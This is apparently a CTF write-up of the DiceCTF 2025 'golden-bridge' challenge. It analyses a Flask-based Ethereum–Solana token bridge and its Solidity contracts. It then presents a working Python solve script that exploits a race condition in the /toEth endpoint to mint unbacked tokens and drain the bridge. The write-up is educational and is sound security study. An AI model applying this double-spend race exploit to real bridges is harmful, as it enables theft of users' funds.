---
layout: post
title: 'DiceCTF 2025 Quals: Golden-Bridge'
date: 2025-03-30 20:00 +0100
categories: [CTF, DiceCTF]
tags: [blockchain, web3, python, solidity, ethereum, solana]
media_subpath: /images/dicectf_quals_2025/
image:
    path: banner.png
---
This write-up contains my solution to the `misc/golden-bridge` challenge from the CTF event hosted by [DiceGang](https://ctf.dicega.ng/), [DiceCTF 2025 Quals](https://ctftime.org/event/2617).

The challenge contains an Ethereum side and a Solana side, connecting them with a Bridge

For the Ethereum side, I used [web3.py](https://github.com/ethereum/web3.py) to interact with the contracts and the [REMIX IDE](https://remix.ethereum.org) for generating ABIs.

For the Solana side, I used [solana.py](https://github.com/michaelhly/solana-py) and [solders](https://github.com/michaelhly/solana-py).

The challenge provided a compressed `.zip` file with all the files needed to run the challenge locally, making it easier to test things.

## Initial Analysis

### Description
**Author**: arcblroth

Introducing `$BBL` - a smooth revolution in cross-chain defi technology!
Though we haven't gotten back our audit results yet, we believe in the future of Bubble so much that we've decided to shadow-launch it today!
Grab your 10 free `$FTH`s from the airdrop (while supplies last), and remember to watch out for the wind...

From reading the description, without looking at any of the files, there's one useful hint: we can claim 10 `$FTH` from an airdrop.

### Web Interface

After building the image and running the docker container, we open `http://localhost:5000` and are greeted with this page:

![Golden Bridge Web Page](golden_bridge_interface.png)

The page has two main functionalities:

- Sending **Ethereum Bubbles** to **Solana Bubbles**
- Sending **Solana Bubbles** to **Ethereum Bubbles**.

Both of these functionalities need the private key (or keypair), the amount of bubbles, and the destination address.

To find out if there are any more endpoints and what they do, we can look at the file `bridge/app.py` which handles the web page.

This is a pretty long file so let's look at relevant snippets:

```py
<...>

app.secret_key = os.urandom(32).hex()

<...>

@app.get("/")
def index():
  return render_template("index.html")

@app.get("/player.json")
def player():
  return player_info

```

The secret_key is a 32 byte long random so we ignore that attack vector, but there's a `/player.json` endpoint that returns player_info, which seems pretty useful:

```json
{
  "ethereum": {
    "address": "0x526946045325f354922905d6736f87d28aFeC1AB",
    "private_key": "0x9da9b5b612932a1fd930c613aa8547efc73aa7da399263bc73caaab72a5cc25b",
    "rpc": "localhost:5000/eth",
    "setup": "0xb8295198fBaeFc8d690f5c97a0161eAB1B6d99DF"
  },
  "solana": {
    "bridge": "GLCW94UuT1DkrtBhdr9pUkoDeBvsXgR3aZLwXex185sT",
    "keypair": [184, 165, 177, 179, 163, 198, 161, 11, 220, 6, 5, 223, 19, 29, 144, 145, 254, 71, 107, 84, 245, 179, 199, 148, 134, 48, 151, 28, 0, 35, 112, 231, 99, 146, 229, 196, 54, 36, 38, 235, 179, 140, 6, 7, 64, 251, 237, 41, 248, 62, 237, 24, 156, 245, 175, 170, 146, 27, 23, 105, 99, 33, 62, 143],
    "mint": "BxLWqEvyNShDBXzj1q1GvmNYc252Et5nASbhUGzuA2u3",
    "pubkey": "7hhHBY9DSu5Ra24aF9oYbdQFAdqESGmVKshhyPixtqZ8",
    "rpc": "localhost:5000/sol"
  }
}
```

Let's break down the **json** file:

- Ethereum
    - `address`: Our account address;
    - `private_key`: Our account private key;
    - `rpc`: the ethereum RPC URL;
    - `setup`: the setup contract address;
- Solana
    - `bridge`: The bridge public key (or address);
    - `keypair`: A keypair containing our account private and public key;
    - `mint`: The mint public key;
    - `pubkey`: Our account public key;
    - `rpc`: the solana RPC URL.

With this **json** file, we can interact with the network, either through scripting or through the web interface by filling out the form. Let's try to use the form and see where that leads. 

If we try to send 1 Ethereum Bubble to Solana, we get this error message: `oh no: Solana account does not have an associated token account for $BBL, please fund one yourself >:D`,

And if we try to send 1 Solana Bubble to Ethereum, we get a similar error message: `oh no: Solana account does not have an associated token account for $BBL`.

With these messages, we can assume we have no `$BBL` balance in our Solana associated token account, since it doesn't exist, so we found our first step. Let's keep looking at `app.py` to see if we find more clues.

```py
# https://ethereum.stackexchange.com/a/70244
def eth_transact(fun: ContractFunction, signer: EthAccount):
  tx = fun.build_transaction({
    "from": signer.address,
    "nonce": w3.eth.get_transaction_count(signer.address),
  })
  tx_signed = signer.sign_transaction(tx)
  w3.eth.send_raw_transaction(tx_signed.raw_transaction)
```

The `eth_transact()` function has logic to allow the server to make ethereum transactions, possibly when the user submits the form;

```py
# remove $BBL that has been deposited in the Bridge on
# the Ethereum side, then mint $BBL on the Solana side
@app.post("/toSol")
def toSol():
  try:
    key = request.json["key"]
    if not (isinstance(key, str) and key.startswith("0x")):
      return "Invalid key", 400
    amount = request.json["amount"]
    if not (isinstance(amount, int) and amount > 0):
       return "Invalid amount", 400
    target = request.json["target"]
    if not isinstance(target, str):
      return "Invalid target", 400
    
    acc = EthAccount.from_key(key)
    target = Pubkey.from_string(target)
    if not target.is_on_curve():
       return "Invalid target (not on curve)", 400
    target_ata = spl_token.get_associated_token_address(target, sol_bbl.pubkey(), TOKEN_PROGRAM_ID)
    if solana.get_account_info(target_ata).value is None:
      return "Solana account does not have an associated token account for $BBL, please fund one yourself >:D", 400
    
    eth_transact(eth_Bridge.functions.toBridge(acc.address, amount), eth_deployer)
    sol_bridge_spl.mint_to(target_ata, sol_bridge, amount)
    return f"Successfully transferred your $BBL!", 200
  except Exception as e:
    app.logger.error(traceback.format_exc())
    return str(e), 400
```

The `toSol()` function removes `$BBL` from the bridge on the Ethereum side, and mints it on the Solana side. 
It starts by verifying if the input is valid, and making sure the solana target is valid with the `is_on_curve()` function. After this, it checks if the target has an associated token account (this is where we failed previously) and if it does, it takes the `amount` from the Ethereum account into the bridge, and mints it on the Solana account.

```py
# transfer and burn $BBL on the Solana side, then
# credit $BBL into the Bridge on the Ethereum side
@app.post("/toEth")
def toEth():
  try:
    key = request.json["key"]
    if not isinstance(key, str):
      return "Invalid key", 400
    amount = request.json["amount"]
    if not (isinstance(amount, int) and amount > 0):
       return "Invalid amount", 400
    target = request.json["target"]
    if not (isinstance(target, str) and target.startswith("0x")):
      return "Invalid target", 400
    
    src = Keypair.from_json(key)
    src_ata = spl_token.get_associated_token_address(src.pubkey(), sol_bbl.pubkey(), TOKEN_PROGRAM_ID)
    if solana.get_account_info(src_ata).value is None:
      return "Solana account does not have an associated token account for $BBL", 400
    
    # bruh SPLToken doesn't let us compose two instructions
    recent_blockhash = solana.get_latest_blockhash().value.blockhash
    ixs = [
      spl_token.transfer(
        spl_token.TransferParams(
          program_id=TOKEN_PROGRAM_ID,
          source=src_ata,
          dest=sol_bridge_ata,
          owner=src.pubkey(),
          amount=amount,
          signers=[src.pubkey()],
        )
      ),
      spl_token.burn(
        spl_token.BurnParams(
          program_id=TOKEN_PROGRAM_ID,
          account=sol_bridge_ata,
          mint=sol_bbl.pubkey(),
          owner=sol_bridge.pubkey(),
          amount=amount,
          signers=[sol_bridge.pubkey()],
        )
      )
    ]
    solana.send_transaction(
      SolanaTransaction(
        [sol_bridge, src],
        SolanaMessage.new_with_blockhash(ixs, src.pubkey(), recent_blockhash),
        recent_blockhash
      )
    )
    
    eth_transact(eth_Bridge.functions.fromBridge(target, amount), eth_deployer)
    return f"Successfully transferred your $BBL!", 200
  except Exception as e:
    app.logger.error(traceback.format_exc())
    return str(e), 400
```

The `toEth()` function is the exact opposite from the `toSol()` function, it transfers `$BBL` from the Solana account into the Ethereum account.

```py
# I believe my code is flawless so if you can steal all 1_000_000_000 $BBL gg
# (please return it I will give you a 10% bounty I have a lil megute to feed)
@app.get("/flag")
def flag():
  try:
    if eth_Setup.functions.isSolved().call():
      return os.environ.get("FLAG", "dice{test_flag}")
    return "no flag for u >:D", 403
  except Exception:
    return "no flag for u >:D", 403

if __name__ == "__main__":
    app.run("0.0.0.0", 8000, debug=True)
```

The `flag()` function gets the flag if we succeed in solving the challenge.

### Endpoints Found

So these are the endpoints we gathered:

- `/player.json`: Contains the player's account and useful contract addresses
- `/eth`: Contains the Ethereum RPC
- `/sol`: Contains the Solana RPC
- `/toSol`:
- `/toEth`:
- `/flag`: Contains the flag (after we solve the challenge)

### Creating ATA

Before anything, let's create an ATA (Associated Token Account) to get past the error and see if there's any more information to extract.

To do this, we can use this function:

```py
def create_token_account():

	ata_addr = spl_token.get_associated_token_address(sol_player_keypair.pubkey(), sol_mint_addr, TOKEN_PROGRAM_ID)

	if solana.get_account_info(ata_addr).value is None:
		print("ATA doesn't exist, creating it")
		recent_blockhash = solana.get_latest_blockhash().value.blockhash
		ix = [
			spl_token.create_associated_token_account(
				payer = sol_player_keypair.pubkey(),
				owner = sol_player_keypair.pubkey(),
				mint = sol_mint_addr,
				token_program_id = TOKEN_PROGRAM_ID,
				)
			]
		solana.send_transaction(
			SolanaTransaction(
				[sol_player_keypair],
				SolanaMessage.new_with_blockhash(ix, sol_player_keypair.pubkey(), recent_blockhash),
				recent_blockhash
				)
			)
		print("Waiting for transaction to complete...")
		sleep(15)
		return ata_addr
	else:
		print(f"ATA already exists: {ata_addr}")
		return ata_addr
```

The `create_token_account()` function uses `get_account_info()` to check if it exists already, if it doesn't it creates it by creating the instruction using `create_associated_token_account()`, saving it inside the `ix` variable, and then sending it.

> I kept the imports equal to what was on app.py, making things like SolanaTransaction have a different name compared to the normal import.
{: .prompt-info }

After this, let's check what the web page says if we try to transfer tokens. By trying to transfer 1 Ethereum Bubble to Solana, we get `execution reverted: Inssuficient BBL in Bridge`, and by doing the inverse operation, the page says `Error: insufficient funds`, which leads us to the conclusion that we have no `$BBL` on either account.

For our next step, we'll analyze the Ethereum Contract files to find out where the airdrop is, and what the `$FTH` tokens are, since the Golden Bridge deals with `$BBL`.


## Ethereum Contracts

Looking in the `/eth/src` folder, we find 4 contract files, let's take a look at them:

### Feather.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Feather is ERC20 {
  address public immutable owner;

  constructor() ERC20("FEATHER", "FTH") {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "not owner");
    _;
  }

  function mint(address recipient, uint256 amount) external onlyOwner {
    _mint(recipient, amount);
  }
}
```
{: file="Feather.sol" }

The **Feather** contract is quite simple, it has the `onlyOwner()` modifier which when paired with a function (in this case `mint()`), only lets the owner of the contract call it. Because of this, we can only call the functions in **ERC20**. The `$FTH` mentioned in the description is one of these tokens.

> **ERC20.sol** adds a lot of functions to do with tokens. We won't go over them but since we'll use a few I added them to the [References](#references)
{: .prompt-info }

### Bubble.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Feather.sol";

// A Bubble is a wrapped Feather.
contract Bubble is ERC20 {
  Feather public immutable feather;

  constructor(Feather feather_) ERC20("BUBBLE (wFTH)", "BBL") {
    feather = feather_;
  }

  function wrap(uint256 amount) external {
    feather.transferFrom(msg.sender, address(this), amount);
    _mint(msg.sender, amount);
  }

  function unwrap(uint256 amount) external {
    _burn(msg.sender, amount);
    feather.transfer(msg.sender, amount);
  }
}
```
{: file="Bubble.sol" }

The **Bubble** contract is also simple, it lets us know a Bubble (`$BBL`) is a wrapped Feather (`$FTH`), and it lets us `wrap()` and `unwrap()` these at will. All the **ERC20** functions are also available here.

### Bridge.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./Bubble.sol";

contract Bridge {
  address public owner;
  Bubble public immutable bubble;
  mapping(address => uint256) public accounts;

  constructor(Bubble bubble_) {
    owner = msg.sender;
    bubble = bubble_;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "not owner");
    _;
  }

  function changeOwner(address newOwner) external onlyOwner {
    owner = newOwner;
  }

  function deposit(uint256 amount) external {
    bubble.transferFrom(msg.sender, address(this), amount);
    accounts[msg.sender] += amount;
  }

  function withdraw(uint256 amount) external {
    require(accounts[msg.sender] >= amount, "Insufficient BBL in Bridge");
    accounts[msg.sender] -= amount;
    bubble.transfer(msg.sender, amount);
  }

  function fromBridge(address recipient, uint256 amount) external onlyOwner {
    accounts[recipient] += amount;
  }

  function toBridge(address recipient, uint256 amount) external onlyOwner {
    require(accounts[recipient] >= amount, "Insufficient BBL in Bridge");
    accounts[recipient] -= amount;
  }
}
```
{: file="Bridge.sol" }

The **Bridge** contract is slightly more complicated, so let's analyze it:

- There's a `mapping(address => uint256) public accounts` mapping that saves how much `$BBL` we have on the **Bridge**;
- The `onlyOwner()` modifier is also present;
- A `changeOwner()` function exists but only the owner can call it so there's not much use;
- `deposit()` allows us to deposit `$BBL` from our account to our account on the **Bridge** mapping;
- `withdraw()` allows us to do the inverse operation;
- We are allowed to call `deposit()` and `withdraw()` since they do not have the `onlyOwner()` modifier;
- `fromBridge()` is called from the `/toEth` endpoint, converting **Solana Bubbles** into **Ethereum Bubbles**;
- `toBridge()` is called from the `/toSol` endpoint, doing the inverse operation;
- We are not allowed to call `fromBridge()` and `toBridge()` since they have the `onlyOwner()` modifier.

### Setup.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import "./Feather.sol";
import "./Bubble.sol";
import "./Bridge.sol";

contract Setup {
  Feather public immutable feather;
  Bubble public immutable bubble;
  Bridge public immutable bridge;
  bool private airdropped;

  constructor() {
    airdropped = false;
    uint256 liquidity = 1_000_000_000;
    feather = new Feather();
    feather.mint(address(this), liquidity);
    bubble = new Bubble(feather);
    feather.approve(address(bubble), liquidity);
    bubble.wrap(liquidity);
    bridge = new Bridge(bubble);
    bubble.transfer(address(bridge), liquidity);
    bridge.changeOwner(msg.sender);
  }

  function airdrop() external {
    if (airdropped) revert("no more airdrops :(");
    feather.mint(msg.sender, 10);
    airdropped = true;
  }

  function isSolved() external view returns (bool) {
    return bubble.balanceOf(address(bridge)) == 0;
  }
}

```
{: file="Setup.sol" }

Finally, the **Setup** contract holds all the initial setup of all the other contracts, and we should highlight a few things:

- `uint256 liquidity = 1_000_000_000`: this is how many tokens are minted;
- `feather.mint(address(this), liquidity)`: 1 billion `$FTH` are minted for the **Setup**;
- `bubble.wrap(liquidity)`: the 1 billion `$FTH` are wrapped into `$BBL`;
- `bubble.transfer(address(bridge), liquidity)`: the 1 billion `$BBL` goes into the bridge;
- `bridge.changeOwner(msg.sender)`: the bridge owner becomes the **Setup** contract.

Also contains the `airdrop()` function we were looking for, that allows us to get a one-time mint of 10 `$FTH` into our account.

Finally, it contains our objective in the `isSolved()` function, which is empty out the `$BBL` balance of the bridge.

>This was also in the comments on `app.py`
{: .prompt-info}

So how can we withdraw 1 billion `$BBL` from the **Bridge** in order to solve the challenge? Let's look back into `app.py` now that we've broken down the contracts.

## Solution

To solve the challenge, it's possible to exploit the `/toEth` endpoint to mint additional `$BBL`, specifically the part where it mints and burns on the Solana side. Here's the particular code snippet again:

```py
def toEth():
    <...>    
    # bruh SPLToken doesn't let us compose two instructions
    recent_blockhash = solana.get_latest_blockhash().value.blockhash
    ixs = [
      spl_token.transfer(
        spl_token.TransferParams(
          program_id=TOKEN_PROGRAM_ID,
          source=src_ata,
          dest=sol_bridge_ata,
          owner=src.pubkey(),
          amount=amount,
          signers=[src.pubkey()],
        )
      ),
      spl_token.burn(
        spl_token.BurnParams(
          program_id=TOKEN_PROGRAM_ID,
          account=sol_bridge_ata,
          mint=sol_bbl.pubkey(),
          owner=sol_bridge.pubkey(),
          amount=amount,
          signers=[sol_bridge.pubkey()],
        )
      )
    ]
    solana.send_transaction(
      SolanaTransaction(
        [sol_bridge, src],
        SolanaMessage.new_with_blockhash(ixs, src.pubkey(), recent_blockhash),
        recent_blockhash
      )
    )
    
    eth_transact(eth_Bridge.functions.fromBridge(target, amount), eth_deployer)
    return f"Successfully transferred your $BBL!", 200
    <...>
```

If you look at it closely, there is no verification on whether or not the Solana transaction has completed before the Ethereum transaction is done, and so, since the Solana transaction is pretty slow, it allows us to transfer more **Solana Bubbles** than we have into **Ethereum Bubbles**, before it even processes the transfer or the burn of the token.

### Method

With this exploit found, we can architect our solution like this:

1. Create an ATA account
2. Get airdrop
3. Wrap the 10 airdropped `$FTH`
4. Deposit the 10 `$BBL`
5. Use `toSol` to send **Ethereum Bubbles** to **Solana Bubbles**
6. Wait for the transaction
7. Use `toEth` to send **Solana Bubbles** to **Ethereum Bubbles** multiple times
8. Repeat 5-7 until 1 billion `$BBL` in **Ethereum Bubbles**
9. Withdraw all `$BBL` from the bridge
10. Call `/flag` and win!

### Solve Script

We've created an ATA account back in the [Initial Analysis](#creating-ata), but let's go through all the steps:

#### 1. Creating an ATA Account

```py
def create_token_account():
	ata_addr = spl_token.get_associated_token_address(sol_player_keypair.pubkey(), sol_mint_addr, TOKEN_PROGRAM_ID)

	if solana.get_account_info(ata_addr).value is None:
		print("ATA doesn't exist, creating it")
		recent_blockhash = solana.get_latest_blockhash().value.blockhash
		ix = [
			spl_token.create_associated_token_account(
				payer = sol_player_keypair.pubkey(),
				owner = sol_player_keypair.pubkey(),
				mint = sol_mint_addr,
				token_program_id = TOKEN_PROGRAM_ID,
				)
			]
		solana.send_transaction(
			SolanaTransaction(
				[sol_player_keypair],
				SolanaMessage.new_with_blockhash(ix, sol_player_keypair.pubkey(), recent_blockhash),
				recent_blockhash
				)
			)
		print("Waiting for transaction to complete...")
		sleep(15)
		return ata_addr
	else:
		print(f"ATA already exists: {ata_addr}")
		return ata_addr
```

> It wasn't mentioned earlier but for this function to work there has to be a connection to the solana RPC, in this case `solana`.
{: .prompt-info}
#### 2. Getting the Airdrop

```py
def get_airdrop():
    nonce = w3.eth.get_transaction_count(eth_player_addr)
	tx = setup.functions.airdrop().build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'nonce': nonce,
	})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	return tx_receipt
```

> For the `get_airdrop()` function to be successful we also need a connection to the ethereum RPC, in this case `w3`. Additionally, there has to be a contract instance generated from the ABI and the address, in this case `setup`
{: .prompt-info}

#### 3. Wrapping the Airdropped Feathers

```py
def wrap(amount):
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	fth_bal = get_fth_bal()
	if fth_bal < amount:
		print(f"Tried wrapping {amount}, have {fth_bal} FTH")
		return
	approve_tx = feather.functions.approve(eth_bubble_addr, amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key=eth_player_key)
	approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)
	approve_tx_receipt = w3.eth.wait_for_transaction_receipt(approve_tx_hash)
	nonce += 1
	tx = bubble.functions.wrap(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	print(f"Wrapped {amount} FTH")
	return tx_receipt
```
> We need to approve the **Feather** contract making transactions in our name so that we can successfully wrap `$FTH` into `$BBL`.
{: .prompt-info}

#### 4. Depositing the Bubbles into the Bridge

```py
def deposit_bbl(amount):
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	bbl_bal = get_bbl_bal_eth_player()
	if bbl_bal < amount:
		print(f"Tried depositing {amount}, have {bbl_bal} $BBL")
		return
	tx = bridge.functions.deposit(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	print(f"Deposited {amount} $BBL into the bridge")
	return receipt
```

#### 5. Sending Ethereum Bubbles to Solana Bubbles

```py
def bbl_to_sol(amount):
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	approve_tx = bubble.functions.approve(eth_bridge_addr, amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key=eth_player_key)
	approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)
	approve_tx_receipt = w3.eth.wait_for_transaction_receipt(approve_tx_hash)
	data = {
		"key": eth_player_key,
		"amount": amount,
		"target": str(sol_player_pubkey)
	}
	res = requests.post(f"{base_addr}/toSol", json=data)
	print(res.text)
```
#### 6. Waiting for the Solana Transaction

```py
start_time = time()
while time() - start_time < 30:
    curr_bal = int(get_bbl_bal_sol_player())
    if curr_bal >= base_amount:
        print(f"Balance updated! {curr_bal} $BBL")
        break
    print(f"Waiting for $BBL balance on SOL account to update...")
    sleep(2)
```

> This snippet will be included in the [looping logic](#8-exploiting-until-1-billion-bubbles)
{: .prompt-info}

#### 7. Minting new Ethereum Bubbles

```py
def bbl_to_eth(amount):
	data = {
			"key": sol_player_keypair.to_json(),
			"amount": amount,
			"target": eth_player_addr,
		}
	res = requests.post(f"{base_addr}/toEth", json=data)
	print(res.text)
```

#### 8. Exploiting until 1 Billion Bubbles

```py
base_amount = 10
while get_bbl_bal_eth_player_bridge() <= 1_000_000_000:
    bbl_to_sol(base_amount)
    start_time = time()
    while time() - start_time < 30:
        curr_bal = int(get_bbl_bal_sol_player())
        if curr_bal >= base_amount:
            print(f"Balance updated! {curr_bal} $BBL")
            break
        print(f"Waiting for $BBL balance on SOL account to update...")
        sleep(2)

    for _ in range(11):
        bbl_to_eth(base_amount)
    base_amount *= 10
    print(f"Player Account in Bridge: {get_bbl_bal_eth_player_bridge()} $BBL")
    print(f"Player Account in SOL: {get_bbl_bal_sol_player()} $BBL")
```

#### 9. Withdraw all Ethereum Bubbles from the Bridge

```py
def withdraw_bbl(amount):
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	bbl_bal = get_bbl_bal_eth_bridge()
	if bbl_bal < amount:
		print(f"Tried withdrawing {amount}, bridge has {bbl_bal} $BBL")
	tx = bridge.functions.withdraw(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	w3.eth.wait_for_transaction_receipt(tx_hash)

	print(f"Withdrawed {amount} $BBL from the bridge")
```

#### 10. Win!

```py
def get_flag():
	print(requests.get(f"{base_addr}/flag").text)
```

## References

- [REMIX IDE](https://remix.ethereum.org)
- [web3.py Documentation](https://web3py.readthedocs.io/en/stable/)
- [Solders Documentation](https://kevinheavey.github.io/solders/)
- [Solana.py Documentation](https://michaelhly.com/solana-py/)
- [ERC20.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
- [DiceGang](https://ctf.dicega.ng/)
- [Full Solve Script](https://github.com/EddWasTaken/CTF-Solutions/blob/main/Blockchain/DiceCTFQuals2025/golden_bridge.py)
